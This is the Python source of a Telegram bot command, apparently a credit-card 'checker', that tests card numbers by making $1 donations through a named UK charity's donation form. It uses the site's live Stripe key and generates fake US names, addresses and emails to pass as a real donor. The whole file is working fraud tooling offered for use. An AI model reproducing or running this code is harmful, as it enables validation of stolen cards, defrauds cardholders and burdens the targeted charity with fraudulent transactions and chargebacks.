# commands/st1.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import random
import re
import time
from bs4 import BeautifulSoup

router = Router()

class USAddressGenerator:
    LOCATIONS = [
        {"city": "New York", "state": "NY", "zip": "10001", "state_full": "New York"},
        {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_full": "California"},
        {"city": "Chicago", "state": "IL", "zip": "60601", "state_full": "Illinois"},
    ]
    FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
    STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln"]

    @classmethod
    def generate(cls):
        loc = random.choice(cls.LOCATIONS)
        return {
            "first_name": random.choice(cls.FIRST_NAMES),
            "last_name": random.choice(cls.LAST_NAMES),
            "address": f"{random.randint(100,9999)} {random.choice(cls.STREETS)}",
            "address_2": random.choice(["", f"Apt {random.randint(1,50)}"]),
            "city": loc["city"],
            "state": loc["state"],
            "state_full": loc["state_full"],
            "zip": loc["zip"],
            "email": f"{random.choice(cls.FIRST_NAMES).lower()}{random.randint(1,999)}@gmail.com"
        }

def check_card_sync(card_str: str) -> str:
    parts = card_str.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use: CC|MM|YY|CVV"
    cc, mm, yy, cvv = [p.strip() for p in parts]
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = f"20{yy}"
    yy_short = yy[-2:]

    session = requests.Session()
    address = USAddressGenerator.generate()

    # 1. Get form hash
    url = "https://www.bravehound.co.uk/wp-admin/admin-ajax.php"
    payload = {'action': 'give_donation_form_reset_all_nonce', 'give_form_id': '13302'}
    headers = {'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
    resp = session.post(url, data=payload, headers=headers)
    if resp.status_code != 200:
        return "❌ Failed to get form hash"
    form_hash = resp.json().get('data', {}).get('give_form_hash')
    if not form_hash:
        return "❌ No form hash"

    # 2. Create Stripe payment method
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_data = {
        'type': 'card',
        'billing_details[name]': f"{address['first_name']} {address['last_name']}",
        'billing_details[email]': address['email'],
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy_short,
        'key': 'pk_live_SMtnnvlq4TpJelMdklNha8iD',
        '_stripe_account': 'acct_1GZhGGEfZQ9gHa50',
        'payment_user_agent': 'stripe.js/668d00c08a; stripe-js-v3/668d00c08a',
        'referrer': 'https://www.bravehound.co.uk',
    }
    stripe_headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    resp = session.post(stripe_url, data=stripe_data, headers=stripe_headers)
    if resp.status_code != 200:
        return "❌ Stripe payment method creation failed"
    pm_id = resp.json().get('id')
    if not pm_id:
        return "❌ No payment method ID"

    time.sleep(random.uniform(1, 2))

    # 3. Submit donation
    donate_url = "https://www.bravehound.co.uk/donation/"
    donate_data = {
        'give-honeypot': '',
        'give-form-id-prefix': '13302-1',
        'give-form-id': '13302',
        'give-form-hash': form_hash,
        'give-amount': '1.00',
        'give_stripe_payment_method': pm_id,
        'payment-mode': 'stripe',
        'give_first': address['first_name'],
        'give_last': address['last_name'],
        'give_email': address['email'],
        'card_name': f"{address['first_name']} {address['last_name']}",
        'give_gift_check_is_billing_address': 'yes',
        'give_gift_aid_billing_country': 'US',
        'give_gift_aid_card_address': address['address'],
        'give_gift_aid_card_address_2': address['address_2'],
        'give_gift_aid_card_city': address['city'],
        'give_gift_aid_card_state': address['state'],
        'give_gift_aid_card_zip': address['zip'],
        'give_action': 'purchase',
        'give-gateway': 'stripe'
    }
    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    resp = session.post(donate_url, data=donate_data, headers=headers)
    text = resp.text
    if re.search(r'(thank\s?you|successfully|succeeded)', text, re.I):
        return "✅ APPROVED – $1 donation successful"
    error_match = re.search(r'<p>.*?<strong>Error</strong>:(.*?)<br', text, re.DOTALL)
    if error_match:
        return f"❌ DECLINED – {error_match.group(1).strip()[:100]}"
    return "❌ DECLINED – Unknown error"

async def run_st1(card_str: str):
    return await asyncio.to_thread(check_card_sync, card_str)

@router.message(Command("st1"))
async def cmd_st1(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ **Usage:** `/st1 CC|MM|YY|CVV`\nExample: `/st1 4111111111111111|12|28|123`")
        return
    card = args[1].strip()
    progress = await message.answer("⏳ Checking card ($1 donation)...")
    result = await run_st1(card)
    await progress.edit_text(f"💳 `{card}`\n📦 {result}\n\nBy @hqdeven")
